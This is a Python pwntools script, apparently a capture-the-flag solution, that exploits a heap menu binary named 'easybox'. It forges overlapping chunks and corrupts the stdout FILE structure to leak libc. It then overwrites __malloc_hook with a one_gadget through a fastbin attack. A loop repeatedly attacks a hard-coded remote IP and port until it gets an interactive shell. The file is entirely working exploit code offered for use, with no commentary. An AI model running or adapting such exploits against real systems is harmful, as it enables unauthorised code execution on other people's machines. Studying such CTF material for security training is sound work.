#! /usr/bin/python

import sys
from pwn import *
context.binary = ELF('./easybox')
libc = context.binary.libc

#context.log_level = 'debug'

def menu(ch):
    p.sendlineafter('>>>',str(ch))


def dbg():
    gdb.attach(p)
    raw_input("dbg")
    
def add(idx,size,content):
    menu(1)
    p.sendlineafter("idx:", str(idx))
    p.sendlineafter("len:", str(size))
    p.sendafter('content:', content)

def free(idx):
    menu(2)
    p.sendlineafter('idx:', str(idx))

def exploit():

    ###chunk overlapping###
    add(0,0x68,'aaa')
    add(1,0x200,'bbb')
    add(2,0x60,'ccc')
    add(3,0x60,'ddd')
    add(4,0xf0,'ddd')

    # modify 
    payload = 'A' * 0x60 + p64(0) + '\xf1'
    free(0)
    add(0,0x68,payload)


    free(2)
    free(1)
    free(3)

    # modify fd'size & fd
    add(1,0x200,'a')
    add(3, 0xd0, '\xdd\x35')

    free(1)
    add(2, 0x208, 'a'*0x200 + p64(0x211) + '\x71')

    add(5, 0x60, 'padding')	#
    #dbg()
    add(6, 0x60, 'padding')	#
    
    # IO_FILE leak libc
    menu(1)
    p.sendlineafter("idx:", str(9))
    p.sendlineafter("len:", str(0x68))
    p.sendlineafter('content:', 'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')

    p.recvline()
    #p.interactive()
    data = p.recv(0x90)
    print("data ==>", data)
    leak = u64(data[0x88:])
    print("leak ==>",hex(leak))

    if leak&0x7f0000000280 == 0x7f0000000280:
        libc_base = leak + 0x39f660 - libc.symbols['_IO_2_1_stdin_']	# or __IO_file_jumps
        print "libc_base ==> " + hex(libc_base)


    __malloc_hook = libc_base + libc.symbols['__malloc_hook']
    __libc_realloc = libc_base + libc.symbols['__libc_realloc']
 
    free(3) 
    free(5)
    free(6)
    free(2)
    #add(2, 0x208, 'a'*0x200 + p64(0x211) + '\x71')

    add(5,0x68,p64(__malloc_hook-0x23))
    add(6,0x68,'padding')
    add(6,0x68,'padding')
    #dbg()
    # 0x45226 0x4527a 0xf0364 0xf1207
    one_gadget = libc_base + 0x4527a

    add(7,0x68,'a'*0xb + p64(one_gadget) + p64(__libc_realloc+13))
    
    #p.sendlineafter("idx:", str(9))
    #p.sendlineafter("len:", str(0x10))

    
    p.interactive()


while 1:
    #p = process('easybox')
    p = remote('101.200.53.148',34521)

    try:
        exploit()
        p.close()
    except:
        p.close()
        pass
